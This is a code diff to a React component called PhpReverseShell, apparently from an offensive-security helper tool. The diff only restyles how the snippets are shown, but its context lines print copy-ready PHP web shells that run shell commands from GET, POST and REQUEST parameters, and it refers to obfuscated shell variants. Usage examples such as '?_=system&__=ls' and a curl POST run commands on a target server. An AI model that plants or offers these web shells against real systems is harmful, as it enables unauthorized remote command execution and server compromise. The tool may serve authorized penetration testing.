@@ -14,7 +14,7 @@ import SyntaxHighlighter from 'react-syntax-highlighter';
 import { vs2015 } from 'react-syntax-highlighter/dist/esm/styles/hljs';
 import pretty from 'pretty';
 
-const { Title, Paragraph } = Typography;
+const { Title, Paragraph, Text } = Typography;
 const { Panel } = Collapse;
 const IconFont = createFromIconfontCN( {
     scriptUrl: [ './iconfont.js' ]
@@ -287,7 +287,7 @@ export default function PhpReverseShell () {
                     When you have successfully uploaded your payload, just put your commands after the variable ?cmd=
                     (ex: ?cmd=ls -la")
                 </Paragraph>
-                <Paragraph copyable code editable>{oneLiner}</Paragraph>
+                <Paragraph><pre><Text copyable>{oneLiner}</Text></pre></Paragraph>
                 <Button
                     type='primary'
                     style={{ marginBottom: 10, marginTop: 15 }}
@@ -360,7 +360,7 @@ export default function PhpReverseShell () {
                     marginTop: 15
                 }}
             >
-                <Paragraph copyable code editable>{'<?=`$_GET[0]`?>'}</Paragraph>
+                <Paragraph><pre><Text copyable>{'<?=`$_GET[0]`?>'}</Text></pre></Paragraph>
                 <Paragraph>{' Usage : http://target.com/path/to/shell.php?0=command '}</Paragraph>
                 <Button
                     type='primary'
@@ -391,7 +391,7 @@ export default function PhpReverseShell () {
                     marginTop: 15
                 }}
             >
-                <Paragraph copyable code editable>{'<?=`$_POST[0]`?>'}</Paragraph>
+                <Paragraph><pre><Text copyable>{'<?=`$_POST[0]`?>'}</Text></pre></Paragraph>
                 <Paragraph>{' Usage :   curl -X POST http://target.com/path/to/shell.php -d "0=command" '}</Paragraph>
                 <Button
                     type='primary'
@@ -422,7 +422,7 @@ export default function PhpReverseShell () {
                     marginTop: 15
                 }}
             >
-                <Paragraph copyable code editable>{"<?=`{$_REQUEST['_']}`?>"}</Paragraph>
+                <Paragraph><pre><Text copyable>{"<?=`{$_REQUEST['_']}`?>"}</Text></pre></Paragraph>
                 <Paragraph>Usage :</Paragraph>
                 <Paragraph>- http://target.com/path/to/shell.php?_=command</Paragraph>
                 <Paragraph>- curl -X POST http://target.com/path/to/shell.php -d "_=command" '</Paragraph>
@@ -447,7 +447,7 @@ export default function PhpReverseShell () {
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
-            </div>
+            </div >
             <div
                 key='f'
                 style={{
@@ -455,7 +455,7 @@ export default function PhpReverseShell () {
                     marginTop: 15
                 }}
             >
-                <Paragraph copyable code editable>{shell_obfuscate}</Paragraph>
+                <Paragraph><pre><Text copyable>{shell_obfuscate}</Text></pre></Paragraph>
                 <Paragraph>Usage :</Paragraph>
                 <Paragraph>- http://target.com/path/to/shell.php?0=command</Paragraph>
                 <Button
@@ -479,7 +479,7 @@ export default function PhpReverseShell () {
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
-            </div>
+            </div >
             <div
                 key='g'
                 style={{
@@ -487,7 +487,7 @@ export default function PhpReverseShell () {
                     marginTop: 15
                 }}
             >
-                <Paragraph copyable code editable>{shell_obfuscate_function}</Paragraph>
+                <Paragraph><pre><Text copyable>{shell_obfuscate_function}</Text></pre></Paragraph>
                 <Paragraph>Usage :</Paragraph>
                 <Paragraph>- http://target.com/path/to/shell.php?_=function&__=argument</Paragraph>
                 <Paragraph>- http://target.com/path/to/shell.php?_=system&__=ls</Paragraph>
@@ -512,7 +512,7 @@ export default function PhpReverseShell () {
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
-            </div>
-        </QueueAnim>
+            </div >
+        </QueueAnim >
     );
 };
